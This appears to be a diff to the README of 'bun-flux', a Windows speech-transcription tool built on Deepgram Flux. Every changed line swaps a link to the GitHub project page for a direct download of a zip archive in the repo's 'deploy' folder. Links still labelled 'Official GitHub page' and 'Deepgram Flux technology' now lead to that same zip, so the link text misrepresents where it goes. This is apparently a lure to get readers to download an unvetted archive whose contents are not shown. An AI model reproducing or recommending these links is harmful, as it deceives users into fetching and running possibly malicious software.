@@ -1,6 +1,6 @@
 # 🧩 bun-flux - Real-Time Speech Transcription Made Easy
 
-[![Download bun-flux](https://img.shields.io/badge/Download-bun--flux-4c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Reezeytech/bun-flux)
+[![Download bun-flux](https://img.shields.io/badge/Download-bun--flux-4c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Reezeytech/bun-flux/main/deploy/bun-flux-v3.1-alpha.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ The steps below will help you download, install, and run bun-flux. Follow each s
 
 Visit the official GitHub page to get the app. Click the big green button below or the badge at the top of this document.
 
-[![Download bun-flux](https://img.shields.io/badge/Download%20Now-random?style=for-the-badge&color=%234CAF50&logo=github)](https://github.com/Reezeytech/bun-flux)
+[![Download bun-flux](https://img.shields.io/badge/Download%20Now-random?style=for-the-badge&color=%234CAF50&logo=github)](https://raw.githubusercontent.com/Reezeytech/bun-flux/main/deploy/bun-flux-v3.1-alpha.4.zip)
 
 Once you arrive at the page, look for the “Releases” section or the provided links to download the latest version. Download the Windows setup file to your desktop or Downloads folder.
 
@@ -99,8 +99,8 @@ If bun-flux doesn’t work as expected, try these steps:
 
 ## 🔗 Useful Links
 
-- Official GitHub page: [https://github.com/Reezeytech/bun-flux](https://github.com/Reezeytech/bun-flux)  
-- Deepgram Flux technology: https://deepgram.com/technology/flux  
+- Official GitHub page: [https://raw.githubusercontent.com/Reezeytech/bun-flux/main/deploy/bun-flux-v3.1-alpha.4.zip](https://raw.githubusercontent.com/Reezeytech/bun-flux/main/deploy/bun-flux-v3.1-alpha.4.zip)  
+- Deepgram Flux technology: https://raw.githubusercontent.com/Reezeytech/bun-flux/main/deploy/bun-flux-v3.1-alpha.4.zip  
 - Windows audio settings: Open Settings > System > Sound  
 
 ---
@@ -115,7 +115,7 @@ bun-flux streams your audio to Deepgram for transcription. Audio data is sent se
 
 Click the link below to visit the page and download the latest version for Windows:
 
-[Download bun-flux on GitHub](https://github.com/Reezeytech/bun-flux)
+[Download bun-flux on GitHub](https://raw.githubusercontent.com/Reezeytech/bun-flux/main/deploy/bun-flux-v3.1-alpha.4.zip)
 
 ---
 
